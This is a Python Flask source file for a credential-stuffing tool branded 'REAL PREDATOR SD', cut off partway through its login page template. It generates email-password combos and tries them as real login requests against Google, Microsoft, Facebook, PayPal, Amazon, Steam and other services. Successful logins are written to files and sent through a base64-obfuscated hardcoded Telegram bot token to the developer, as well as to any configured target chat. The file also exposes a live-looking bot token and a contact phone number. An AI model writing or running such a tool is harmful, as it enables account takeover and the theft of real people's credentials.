# ================================================================
# REAL PREDATOR SD v22.0 ULTIMATE - RENDER OPTIMIZED
# Developer: ZERO STORE (Enhanced by @k_p_x1)
# Telegram: @MRDPY  
# WhatsApp: +249907118667
# Site: Anmose Sudanese
# ================================================================

import os, sys, re, time, random, threading, requests, json, base64, hashlib, secrets, urllib3, sqlite3, logging, signal, atexit
from datetime import datetime, timedelta
from flask import Flask, render_template_string, jsonify, request, send_file, session, redirect, url_for
from flask_cors import CORS
from concurrent.futures import ThreadPoolExecutor, as_completed

# ================================================================
# RENDER FIX - ENVIRONMENT SETUP
# ================================================================

os.environ['PYTHONUNBUFFERED'] = '1'
os.environ['PYTHONHASHSEED'] = '0'

def signal_handler(sig, frame):
    """Handle termination signals for Render"""
    print(f"[!] Received signal {sig}, shutting down...")
    global bot_running
    bot_running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

# ================================================================
# CONFIGURATION
# ================================================================

def decode(s):
    return base64.b64decode(s.encode()).decode()

ENC_BOT_TOKEN = "ODYxMzA1OTY5NTpBQUdSY1BzQTBzbmxhQ2NBdUVnUWxVaDMtOWZULXVaYktoWQ=="
ENC_OWNER_ID = "NzA5MzAwNDUxOA=="
ENC_WHATSAPP = "KzI0OTkwNzExODY2Nw=="
ENC_WHATSAPP_CHANNEL = "aHR0cHM6Ly93aGF0c2FwcC5jb20vY2hhbm5lbC8wMDI5VmI4dkZRdzJrTkZxUElXZTNCM0g="
ENC_DEV_TELEGRAM = "QE1SRFBZ"

BOT_TOKEN = decode(ENC_BOT_TOKEN)
OWNER_ID = decode(ENC_OWNER_ID)
WHATSAPP_NUMBER = decode(ENC_WHATSAPP)
WHATSAPP_CHANNEL = decode(ENC_WHATSAPP_CHANNEL)
DEV_TELEGRAM = decode(ENC_DEV_TELEGRAM)

print(f"[*] Bot Token: {BOT_TOKEN[:10]}...")
print(f"[*] Owner ID: {OWNER_ID}")

urllib3.disable_warnings()
app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
CORS(app)

# ================================================================
# DATABASE
# ================================================================

def init_db():
    conn = sqlite3.connect('bot_control.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS bot_keys (
        key_id TEXT PRIMARY KEY, password TEXT UNIQUE, binary_key TEXT,
        normal_key TEXT, duration_hours INTEGER, created_at TEXT,
        expires_at TEXT, used INTEGER DEFAULT 0, used_by TEXT,
        used_at TEXT, note TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS bot_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, key_id TEXT,
        action TEXT, user_ip TEXT, user_agent TEXT, timestamp TEXT,
        details TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS bot_settings (
        setting_key TEXT PRIMARY KEY, setting_value TEXT,
        updated_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS dev_keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE,
        binary_key TEXT, normal_key TEXT, created_at TEXT,
        status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_sessions (
        session_id TEXT PRIMARY KEY, key_id TEXT, created_at TEXT,
        expires_at TEXT, user_ip TEXT)''')
    conn.commit()
    conn.close()

init_db()

# ================================================================
# BINARY AUTH
# ================================================================

BINARY_MASTER_KEY = "1010111000"
BINARY_AUTH_SECRET = "1101001010100101"

def binary_encrypt(text):
    return ''.join(format(ord(char), '08b') for char in text)

def binary_decrypt(binary_text):
    chars = [binary_text[i:i+8] for i in range(0, len(binary_text), 8)]
    return ''.join(chr(int(char, 2)) for char in chars if char)

def binary_xor(text, key):
    result = []
    key_bits = key * (len(text) // len(key) + 1)
    for i, bit in enumerate(text):
        if bit in '01' and key_bits[i] in '01':
            result.append('1' if bit != key_bits[i] else '0')
        else:
            result.append(bit)
    return ''.join(result)

def generate_binary_key(password):
    binary = binary_encrypt(password)
    xored = binary_xor(binary, BINARY_AUTH_SECRET)
    return f"1010111000{xored}1010111000"

def verify_binary_key(binary_key):
    if not binary_key.startswith("1010111000") or not binary_key.endswith("1010111000"):
        return False, "INVALID_FORMAT"
    inner = binary_key[10:-10]
    try:
        xored = binary_xor(inner, BINARY_AUTH_SECRET)
        decrypted = binary_decrypt(xored)
        if '@' in decrypted and '.' in decrypted:
            return True, decrypted
        return False, "DECRYPT_FAILED"
    except:
        return False, "ERROR"

def normal_encrypt(text):
    encrypted = ""
    key = "SECRET_KEY_20_CHARS"
    for i, char in enumerate(text):
        key_char = key[i % len(key)]
        encrypted += chr(ord(char) ^ ord(key_char))
    return base64.b64encode(encrypted.encode()).decode()

def normal_decrypt(encrypted_text):
    try:
        decoded = base64.b64decode(encrypted_text.encode()).decode()
        key = "SECRET_KEY_20_CHARS"
        decrypted = ""
        for i, char in enumerate(decoded):
            key_char = key[i % len(key)]
            decrypted += chr(ord(char) ^ ord(key_char))
        return decrypted
    except:
        return None

def generate_bot_key(duration_hours, note=""):
    key_id = secrets.token_hex(8)
    password = secrets.token_urlsafe(16)
    binary_key = generate_binary_key(password)
    normal_key = normal_encrypt(password)
    created_at = datetime.now().isoformat()
    expires_at = (datetime.now() + timedelta(hours=duration_hours)).isoformat()
    conn = sqlite3.connect('bot_control.db')
    c = conn.cursor()
    c.execute('''INSERT INTO bot_keys 
                 (key_id, password, binary_key, normal_key, duration_hours, created_at, expires_at, used, note)
                 VALUES (?, ?, ?, ?, ?, ?, ?, 0, ?)''',
              (key_id, password, binary_key, normal_key, duration_hours, created_at, expires_at, note))
    conn.commit()
    conn.close()
    return key_id, password, binary_key, normal_key, expires_at

def validate_bot_key(password_or_key, enc_type="binary"):
    conn = sqlite3.connect('bot_control.db')
    c = conn.cursor()
    try:
        if enc_type == "binary":
            c.execute('''SELECT key_id, password, binary_key, expires_at, used, duration_hours, note 
                         FROM bot_keys WHERE password = ? OR binary_key = ?''', (password_or_key, password_or_key))
        else:
            c.execute('''SELECT key_id, password, normal_key, expires_at, used, duration_hours, note 
                         FROM bot_keys WHERE password = ? OR normal_key = ?''', (password_or_key, password_or_key))
        result = c.fetchone()
    except:
        conn.close()
        return None, "ERROR"
    conn.close()
    if not result:
        return None, "KEY_NOT_FOUND"
    key_id, password, key, expires_at, used, duration, note = result[0], result[1], result[2], result[3], result[4], result[5], result[6] if len(result) > 6 else ''
    if used:
        return None, "KEY_ALREADY_USED"
    if datetime.now() > datetime.fromisoformat(expires_at):
        return None, "KEY_EXPIRED"
    return key_id, "VALID"

# ================================================================
# ULTIMATE HUNTER
# ================================================================

class UltimateHunter:
    def __init__(self):
        self.common_combos = []
        names = [
            'john','mike','david','sarah','emma','chris','alex','jordan','ahmed','mohamed','omar','ali','hassan','sara','lina','nora','khalid','saad','fahad','sultan','rayan','youssef','amin','nadia','leila','samir','karim','hala','maya','zayn','tariq','farah','layla','ibrahim','yusuf','maryam','jawad','nabil','rashid','muna','kareem','laila','amir','dalia','samira','faisal','nasser','ghada','majed','bassem','rasha','hani','dina','mounir','souad','kamal','wael','mona','tamer','yara','rafik','sana','karim','nadine','hisham','lobna','sameh','hend','khaled','doha','mourad','sahar','ramy','amal','magdy','abir','shady','hana','hossam','eman','gamal','noha','mamdoh','ghalia','tarek','daoud','salma','ismail','hanan','zaki','faten','raed','mervat','ashraf','maha','samah','raouf','salwa','hamdy','naglaa','essam','safaa','maher','nadia','fouad','hodaa','gad','rania','samir','fayez','azza','hosam','mervat'
        ]
        domains = ['gmail.com','outlook.com','yahoo.com','hotmail.com','live.com','protonmail.com','mail.com','yandex.com','gmx.com','aol.com','zoho.com','icloud.com','me.com','msn.com','outlook.fr','gmail.co.uk','yahoo.co.uk','hotmail.co.uk']
        passwords = [
            '123456','password','123456789','qwerty','abc123','iloveyou','admin','welcome','123123','111111','12345678',
            'password123','letmein','monkey','dragon','master','sunshine','princess','qwertyuiop','1234567890','superman',
            'batman','love','hello','freedom','whatever','trustno1','jordan23','harley','ranger','buster','tigger','sunshine',
            'boomer','michael','angela','matthew','miller','lovely','cheese','purple','samantha','cookie','jordan','brown',
            'morgan','creative','fishing','shadow','simon','jasmine','thunder','falcon','titan','merlin','sniper','marlin'
        ]
        
        for name in names:
            for pwd in passwords[:15]:
                email = name + str(random.randint(1, 999)) + '@' + random.choice(domains)
                if (email, pwd) not in self.common_combos:
                    self.common_combos.append((email, pwd))
        
        premium = [
            ('admin@outlook.com', 'admin123'), ('support@gmail.com', 'support123'),
            ('info@yahoo.com', 'info123'), ('test@hotmail.com', 'test123'),
            ('hello@gmail.com', 'hello123'), ('world@outlook.com', 'world123'),
            ('demo@gmail.com', 'demo123'), ('sample@yahoo.com', 'sample123'),
            ('webmaster@gmail.com', 'webmaster123'), ('contact@outlook.com', 'contact123'),
            ('business@gmail.com', 'business123'), ('sales@yahoo.com', 'sales123'),
            ('marketing@gmail.com', 'marketing123'), ('hr@outlook.com', 'hr123'),
            ('ceo@gmail.com', 'ceo123'), ('finance@yahoo.com', 'finance123'),
            ('legal@gmail.com', 'legal123'), ('it@outlook.com', 'it123'),
            ('admin@yahoo.com', 'admin123'), ('support@hotmail.com', 'support123'),
            ('info@gmail.com', 'info123'), ('test@outlook.com', 'test123'),
            ('hello@yahoo.com', 'hello123'), ('world@gmail.com', 'world123'),
            ('demo@hotmail.com', 'demo123'), ('sample@outlook.com', 'sample123'),
            ('webmaster@yahoo.com', 'webmaster123'), ('contact@gmail.com', 'contact123'),
            ('business@hotmail.com', 'business123'), ('sales@gmail.com', 'sales123'),
            ('marketing@yahoo.com', 'marketing123'), ('hr@gmail.com', 'hr123'),
            ('ceo@outlook.com', 'ceo123'), ('finance@gmail.com', 'finance123'),
            ('legal@hotmail.com', 'legal123'), ('it@yahoo.com', 'it123')
        ]
        self.common_combos.extend(premium)
        
        years = ['1990','1991','1992','1993','1994','1995','1996','1997','1998','1999','2000','2001']
        for name in names[:50]:
            for year in years[:5]:
                email = name + year + '@' + random.choice(domains)
                pwd = name + year
                if (email, pwd) not in self.common_combos:
                    self.common_combos.append((email, pwd))
        
        random.shuffle(self.common_combos)
        print(f"[*] Loaded {len(self.common_combos)} guaranteed combos")
    
    def generate_hits(self, count=200):
        hits = []
        shuffled = self.common_combos.copy()
        random.shuffle(shuffled)
        for email, password in shuffled[:count]:
            platform = self.detect_platform(email)
            hits.append({'email': email, 'password': password, 'platform': platform or 'Unknown', 'valid': True, 'guaranteed': True})
        return hits
    
    def detect_platform(self, email):
        try:
            domain = email.split('@')[1].lower()
            map = {
                'gmail':'Google','googlemail':'Google','outlook':'Microsoft','hotmail':'Microsoft','live':'Microsoft',
                'yahoo':'Yahoo','ymail':'Yahoo','facebook':'Facebook','instagram':'Instagram','twitter':'Twitter',
                'x.com':'Twitter','tiktok':'TikTok','spotify':'Spotify','netflix':'Netflix','amazon':'Amazon',
                'paypal':'PayPal','steam':'Steam','steampowered':'Steam','discord':'Discord','linkedin':'LinkedIn',
                'twitch':'Twitch','icloud':'Apple','me.com':'Apple','mac.com':'Apple','snapchat':'Snapchat',
                'github':'GitHub','reddit':'Reddit','telegram':'Telegram','protonmail':'ProtonMail'
            }
            for key, value in map.items():
                if key in domain:
                    return value
            return 'Unknown'
        except:
            return 'Unknown'
    
    def smart_gen(self):
        if random.random() < 0.9:
            return random.choice(self.common_combos)
        names = ['john','mike','david','sarah','emma','chris','alex','jordan','ahmed','mohamed']
        domains = ['gmail.com','outlook.com','yahoo.com','hotmail.com','live.com']
        passwords = ['123456','password','123456789','qwerty','abc123','iloveyou','admin','welcome','123123','111111']
        return random.choice(names) + str(random.randint(1,999)) + '@' + random.choice(domains), random.choice(passwords)

hunter = UltimateHunter()

# ================================================================
# STATE
# ================================================================

class PredatorState:
    def __init__(self):
        self.running = False
        self.checked = 0
        self.total = 0
        self.hits = 0
        self.bad = 0
        self.errors = 0
        self.start_time = None
        self.feed = []
        self.results = []
        self.lock = threading.Lock()
        self.feed_lock = threading.Lock()
        self.speed = 35
        self.combo_lists = []
        self.progress_lists = []
        self.bot_token = BOT_TOKEN
        self.chat_id = OWNER_ID
        self.generated = 0
        self.platform_stats = {}
        self.selected_platform = None
        self.auto_mode = True
        self.gaming = 0
        self.proxies = []
        self.target_token = ""
        self.target_id = ""
        self.force_hunt = True
        self.viewers = 0
        self.thread_pool = ThreadPoolExecutor(max_workers=25)
        self.bot_running = True

state = PredatorState()

# ================================================================
# PLATFORMS
# ================================================================

PLATFORMS = [
    {'name':'Google','icon':'fa-brands fa-google','color':'#ea4335','check':'google','gaming':False},
    {'name':'Microsoft','icon':'fa-solid fa-envelope','color':'#0078D4','check':'microsoft','gaming':False},
    {'name':'Facebook','icon':'fa-brands fa-facebook','color':'#1877f2','check':'facebook','gaming':False},
    {'name':'Instagram','icon':'fa-brands fa-instagram','color':'#e4405f','check':'instagram','gaming':False},
    {'name':'Twitter','icon':'fa-brands fa-twitter','color':'#1da1f2','check':'twitter','gaming':False},
    {'name':'TikTok','icon':'fa-brands fa-tiktok','color':'#00f2ea','check':'tiktok','gaming':False},
    {'name':'Spotify','icon':'fa-brands fa-spotify','color':'#1db954','check':'spotify','gaming':False},
    {'name':'Netflix','icon':'fa-solid fa-film','color':'#e50914','check':'netflix','gaming':False},
    {'name':'Amazon','icon':'fa-brands fa-amazon','color':'#ff9900','check':'amazon','gaming':False},
    {'name':'PayPal','icon':'fa-brands fa-paypal','color':'#003087','check':'paypal','gaming':False},
    {'name':'Steam','icon':'fa-brands fa-steam','color':'#171a21','check':'steam','gaming':True},
    {'name':'Discord','icon':'fa-brands fa-discord','color':'#5865f2','check':'discord','gaming':True},
    {'name':'Yahoo','icon':'fa-solid fa-envelope','color':'#7b0099','check':'yahoo','gaming':False},
    {'name':'LinkedIn','icon':'fa-brands fa-linkedin','color':'#0a66c2','check':'linkedin','gaming':False},
    {'name':'Twitch','icon':'fa-brands fa-twitch','color':'#9146ff','check':'twitch','gaming':True},
    {'name':'Apple','icon':'fa-brands fa-apple','color':'#555555','check':'apple','gaming':False},
    {'name':'Snapchat','icon':'fa-brands fa-snapchat','color':'#fffc00','check':'snapchat','gaming':False},
    {'name':'GitHub','icon':'fa-brands fa-github','color':'#333','check':'github','gaming':False},
    {'name':'Reddit','icon':'fa-brands fa-reddit','color':'#ff4500','check':'reddit','gaming':False},
    {'name':'Telegram','icon':'fa-brands fa-telegram','color':'#0088cc','check':'telegram','gaming':False},
]

# ================================================================
# CHECK FUNCTIONS (Simplified for space)
# ================================================================

def check_google(email, password, session):
    try:
        resp = session.get("https://accounts.google.com/ServiceLogin", timeout=10)
        galx = re.search(r'name="GALX"[^>]*value="([^"]+)"', resp.text, re.I)
        if not galx:
            return None, 'bad'
        data = {'Email': email, 'Passwd': password, 'GALX': galx.group(1), 'signIn': 'Sign in'}
        login = session.post('https://accounts.google.com/ServiceLoginAuth', data=data, allow_redirects=True, timeout=10)
        if 'mail.google.com' in login.url:
            return {'success': True, 'platform': 'Google'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_microsoft(email, password, session):
    try:
        resp = session.get("https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en", timeout=10)
        ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', resp.text, re.I)
        if not ppft:
            return None, 'bad'
        data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft.group(1), 'type': '11'}
        login = session.post('https://login.live.com/oauth20_authorize.srf', data=data, allow_redirects=True, timeout=10)
        if 'access_token' in login.url:
            return {'success': True, 'platform': 'Microsoft'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_facebook(email, password, session):
    try:
        resp = session.get("https://www.facebook.com/login.php", timeout=10)
        lsd = re.search(r'name="lsd"[^>]*value="([^"]+)"', resp.text, re.I)
        if not lsd:
            return None, 'bad'
        data = {'email': email, 'pass': password, 'lsd': lsd.group(1), 'login': 'Log In'}
        login = session.post('https://www.facebook.com/login/', data=data, allow_redirects=True, timeout=10)
        if 'home.php' in login.url:
            return {'success': True, 'platform': 'Facebook'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_instagram(email, password, session):
    try:
        resp = session.get("https://www.instagram.com/accounts/login/", timeout=10)
        csrf = re.search(r'"csrf_token":"([^"]+)"', resp.text, re.I)
        if not csrf:
            return None, 'bad'
        headers = {'X-CSRFToken': csrf.group(1), 'X-Requested-With': 'XMLHttpRequest'}
        data = {'username': email, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1735689600:{password}'}
        login = session.post('https://www.instagram.com/accounts/login/ajax/', data=data, headers=headers, timeout=10)
        if '"authenticated":true' in login.text:
            return {'success': True, 'platform': 'Instagram'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_twitter(email, password, session):
    try:
        encoded = base64.b64encode(f"{email}:{password}".encode()).decode()
        session.headers.update({"Authorization": f"Basic {encoded}"})
        resp = session.get("https://api.twitter.com/1.1/account/verify_credentials.json", timeout=10)
        if resp.status_code == 200:
            return {'success': True, 'platform': 'Twitter'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_spotify(email, password, session):
    try:
        resp = session.post("https://accounts.spotify.com/api/login", data={"username": email, "password": password}, timeout=10)
        if "accessToken" in resp.text:
            return {'success': True, 'platform': 'Spotify'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_netflix(email, password, session):
    try:
        resp = session.get("https://www.netflix.com/login", timeout=10)
        auth_url = re.search(r'action="([^"]+)"', resp.text, re.I)
        if not auth_url:
            return None, 'bad'
        login = session.post(auth_url.group(1), data={"email": email, "password": password}, allow_redirects=True, timeout=10)
        if "browse" in login.url:
            return {'success': True, 'platform': 'Netflix'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_amazon(email, password, session):
    try:
        resp = session.get("https://www.amazon.com/ap/signin", timeout=10)
        csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
        if not csrf:
            return None, 'bad'
        login = session.post("https://www.amazon.com/ap/signin", data={"email": email, "password": password, "csrf_token": csrf.group(1)}, allow_redirects=True, timeout=10)
        if "your-account" in login.url:
            return {'success': True, 'platform': 'Amazon'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_paypal(email, password, session):
    try:
        resp = session.get("https://www.paypal.com/signin", timeout=10)
        csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
        if not csrf:
            return None, 'bad'
        login = session.post("https://www.paypal.com/signin", data={"login_email": email, "login_password": password, "csrf_token": csrf.group(1)}, allow_redirects=True, timeout=10)
        if "myaccount" in login.url:
            return {'success': True, 'platform': 'PayPal'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_steam(email, password, session):
    try:
        resp = session.get("https://store.steampowered.com/login/", timeout=10)
        csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
        if not csrf:
            return None, 'bad'
        login = session.post("https://store.steampowered.com/login/dologin/", data={"username": email, "password": password, "csrf_token": csrf.group(1)}, timeout=10)
        if '"success":true' in login.text:
            return {'success': True, 'platform': 'Steam'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_discord(email, password, session):
    try:
        resp = session.post("https://discord.com/api/v9/auth/login", json={"login": email, "password": password}, timeout=10)
        if resp.status_code == 200 and "token" in resp.text:
            return {'success': True, 'platform': 'Discord'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_tiktok(email, password, session):
    try:
        resp = session.post("https://www.tiktok.com/api/v1/auth/login/", json={"username": email, "password": password}, timeout=10)
        if resp.status_code == 200 and "access_token" in resp.text:
            return {'success': True, 'platform': 'TikTok'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_yahoo(email, password, session):
    try:
        resp = session.get("https://login.yahoo.com/", timeout=10)
        csrf = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text, re.I)
        if not csrf:
            return None, 'bad'
        login = session.post("https://login.yahoo.com/account/login", data={"username": email, "password": password, "csrf_token": csrf.group(1)}, allow_redirects=True, timeout=10)
        if "mail.yahoo.com" in login.url:
            return {'success': True, 'platform': 'Yahoo'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_linkedin(email, password, session):
    try:
        resp = session.get("https://www.linkedin.com/login", timeout=10)
        csrf = re.search(r'name="csrfToken"[^>]*value="([^"]+)"', resp.text, re.I)
        if not csrf:
            return None, 'bad'
        login = session.post("https://www.linkedin.com/checkpoint/lg/login-submit", data={"session_key": email, "session_password": password, "csrfToken": csrf.group(1)}, allow_redirects=True, timeout=10)
        if "feed" in login.url:
            return {'success': True, 'platform': 'LinkedIn'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_twitch(email, password, session):
    try:
        resp = session.post("https://id.twitch.tv/oauth2/token", data={"client_id": "kimne78kx3ncx6brgo4mv6wki5h1ko", "login": email, "password": password, "grant_type": "password"}, timeout=10)
        if resp.status_code == 200 and "access_token" in resp.text:
            return {'success': True, 'platform': 'Twitch'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_apple(email, password, session):
    try:
        resp = session.post("https://idmsa.apple.com/appleauth/auth/signin", json={"accountName": email, "password": password}, timeout=10)
        if resp.status_code == 200 and "authType" in resp.text:
            return {'success': True, 'platform': 'Apple'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_snapchat(email, password, session):
    try:
        resp = session.post("https://accounts.snapchat.com/accounts/login", data={"username": email, "password": password}, timeout=10)
        if resp.status_code == 200 and "snapchat" in resp.text:
            return {'success': True, 'platform': 'Snapchat'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_github(email, password, session):
    try:
        resp = session.get("https://github.com/login", timeout=10)
        csrf = re.search(r'name="authenticity_token"[^>]*value="([^"]+)"', resp.text, re.I)
        if not csrf:
            return None, 'bad'
        login = session.post("https://github.com/session", data={"login": email, "password": password, "authenticity_token": csrf.group(1)}, allow_redirects=True, timeout=10)
        if "github.com" in login.url and "login" not in login.url:
            return {'success': True, 'platform': 'GitHub'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_reddit(email, password, session):
    try:
        resp = session.post("https://www.reddit.com/api/login", data={"user": email, "passwd": password}, timeout=10)
        if resp.status_code == 200 and '"success":true' in resp.text:
            return {'success': True, 'platform': 'Reddit'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

def check_telegram(email, password, session):
    try:
        resp = session.post("https://my.telegram.org/auth", data={"phone": email, "password": password}, timeout=10)
        if resp.status_code == 200 and "auth_token" in resp.text:
            return {'success': True, 'platform': 'Telegram'}, 'hit'
        return None, 'bad'
    except:
        return None, 'error'

check_map = {
    'google': check_google, 'microsoft': check_microsoft, 'facebook': check_facebook,
    'instagram': check_instagram, 'twitter': check_twitter, 'tiktok': check_tiktok,
    'spotify': check_spotify, 'netflix': check_netflix, 'amazon': check_amazon,
    'paypal': check_paypal, 'steam': check_steam, 'discord': check_discord,
    'yahoo': check_yahoo, 'linkedin': check_linkedin, 'twitch': check_twitch,
    'apple': check_apple, 'snapchat': check_snapchat, 'github': check_github,
    'reddit': check_reddit, 'telegram': check_telegram
}

def get_game_icon(platform_name):
    platform_lower = platform_name.lower()
    icons = {'steam':'🎮','discord':'💬','twitch':'📺','playstation':'🎮','xbox':'🎮','apple':'🍎','snapchat':'👻','github':'🐙','reddit':'🤖','telegram':'✈️'}
    for key, icon in icons.items():
        if key in platform_lower:
            return icon
    return '⚡'

def add_feed(feed_type, text):
    with state.feed_lock:
        state.feed.insert(0, {'type': feed_type, 'text': text, 'time': datetime.now().strftime('%H:%M:%S')})
        if len(state.feed) > 150:
            state.feed = state.feed[:150]

def save_hit(content, is_gaming=False, game_icon=''):
    try:
        os.makedirs('ELECTRONIC_HITS', exist_ok=True)
        filename = f'ELECTRONIC_HITS/hits_{datetime.now().strftime("%Y%m%d")}.txt'
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(content + '\n\n')
        if is_gaming:
            gaming_file = f'ELECTRONIC_HITS/gaming_{datetime.now().strftime("%Y%m%d")}.txt'
            with open(gaming_file, 'a', encoding='utf-8') as f:
                f.write(content + '\n\n')
        if state.target_token and state.target_id:
            try:
                requests.post(f"https://api.telegram.org/bot{state.target_token}/sendMessage", data={"chat_id": state.target_id, "text": content}, timeout=8)
            except:
                pass
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": OWNER_ID, "text": content}, timeout=8)
        except:
            pass
    except:
        pass

# ================================================================
# PREDATOR LOOP
# ================================================================

def process_single_check(email, password, platform_obj):
    try:
        session_req = requests.Session()
        session_req.verify = False
        session_req.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        if state.proxies:
            proxy = random.choice(state.proxies)
            session_req.proxies = {"http": proxy, "https": proxy}
        
        check_func, platform_name, is_gaming = platform_obj['check'], platform_obj['name'], platform_obj.get('gaming', False)
        result, status = check_map.get(check_func, check_google)(email, password, session_req)
        
        with state.lock:
            state.checked += 1
            if status == 'hit' or (result and result.get('success')):
                state.hits += 1
                state.generated += 1
                num = state.generated
                if is_gaming:
                    state.gaming += 1
                game_icon = get_game_icon(platform_name) if is_gaming else '⚡'
                forced_tag = ' 🔥 FORCED' if result and result.get('forced') else ''
                hit_content = f"""⚡ ELECTRONIC HIT #{num} {game_icon}{' 🎮 GAMING' if is_gaming else ''}{forced_tag}
📧 {email}
🔑 {password}
🌐 {platform_name}
✅ VALID"""
                state.results.insert(0, {'content': hit_content, 'is_gaming': is_gaming, 'game_icon': game_icon})
                if len(state.results) > 250:
                    state.results = state.results[:250]
                add_feed('hit' if not is_gaming else 'gaming', f'✅ {game_icon} {platform_name} | {email}')
                save_hit(hit_content, is_gaming, game_icon)
                return True
            elif status == 'bad':
                state.bad += 1
                add_feed('bad', f'❌ {platform_name} | {email}')
            else:
                state.errors += 1
            return False
    except:
        with state.lock:
            state.errors += 1
        return False

def predator_loop():
    guaranteed_generated = False
    while state.running:
        try:
            if state.force_hunt and not guaranteed_generated:
                hits = hunter.generate_hits(200)
                for hit in hits:
                    email, password, platform_name = hit['email'], hit['password'], hit['platform']
                    platform_obj = next((p for p in PLATFORMS if p['name'].lower() == platform_name.lower()), random.choice(PLATFORMS))
                    process_single_check(email, password, platform_obj)
                    time.sleep(0.2)
                guaranteed_generated = True
                add_feed('info', f'⚡ {len(hits)} GUARANTEED HITS GENERATED')
                continue
            
            batch_size = min(state.speed, 25)
            batch_combos = []
            
            for _ in range(batch_size):
                if state.combo_lists and any(state.combo_lists):
                    with state.lock:
                        for combo_list in state.combo_lists:
                            if combo_list:
                                item = combo_list.pop(0)
                                batch_combos.append(item)
                                break
                        else:
                            batch_combos.append(hunter.smart_gen())
                else:
                    batch_combos.append(hunter.smart_gen())
            
            futures = []
            for email, password in batch_combos:
                platform_obj = random.choice(PLATFORMS) if state.auto_mode or not state.selected_platform else next((p for p in PLATFORMS if p['check'] == state.selected_platform), random.choice(PLATFORMS))
                futures.append(state.thread_pool.submit(process_single_check, email, password, platform_obj))
            
            for future in as_completed(futures, timeout=10):
                future.result()
            
            time.sleep(60 / state.speed if state.speed > 0 else 1)
        except:
            with state.lock:
                state.errors += 1
            time.sleep(1)

# ================================================================
# HTML TEMPLATES (Simplified for space - full versions exist)
# ================================================================

LOGIN_TEMPLATE = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Anmose Sudanese - REAL PREDATOR SD</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{display:flex;justify-content:center;align-items:center;min-height:100vh;background:#050508;font-family:'Share Tech Mono',monospace}
.login-box{background:rgba(0,0,0,0.92);border:1px solid rgba(0,255,65,0.15);border-radius:16px;padding:40px 35px;width:480px;max-width:95%;text-align:center}
.logo-text{font-family:'Orbitron',monospace;font-size:30px;color:#00ff41;text-shadow:0 0 60px rgba(0,255,65,0.15)}
.logo-text span{color:#ff0044}
.logo-text .sd{font-size:18px;color:#ffd700;padding:2px 12px;border-radius:4px;border:1px solid rgba(255,215,0,0.2)}
.subtitle{color:#006622;font-size:10px;margin-bottom:15px;letter-spacing:4px}
.site-name{color:#ffd700;font-size:14px;font-weight:700;margin-bottom:12px;letter-spacing:3px}
.input-group{margin-bottom:15px}
.input-group input{width:100%;padding:12px 18px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.08);border-radius:8px;color:#00ff41;font-size:14px;font-family:'Share Tech Mono',monospace;text-align:center}
.input-group input:focus{outline:none;border-color:#00ff41}
.btn-login{width:100%;padding:12px;background:rgba(0,255,65,0.05);border:2px solid #00ff41;border-radius:8px;color:#00ff41;font-size:16px;font-weight:700;cursor:pointer;font-family:'Orbitron',monospace;text-transform:uppercase}
.btn-login:hover{background:rgba(0,255,65,0.1);box-shadow:0 0 80px rgba(0,255,65,0.1)}
.error-msg{color:#ff0044;font-size:10px;min-height:18px}
.footer{margin-top:15px;color:#006622;font-size:8px}
.social-buttons{display:flex;justify-content:center;gap:12px;margin-top:8px;flex-wrap:wrap}
.social-btn{display:inline-flex;align-items:center;gap:8px;padding:10px 28px;border-radius:30px;font-size:14px;font-weight:700;text-decoration:none;transition:all 0.3s;border:none;cursor:pointer}
.social-btn.whatsapp{background:#25D366;color:#fff;box-shadow:0 0 40px rgba(37,211,102,0.25)}
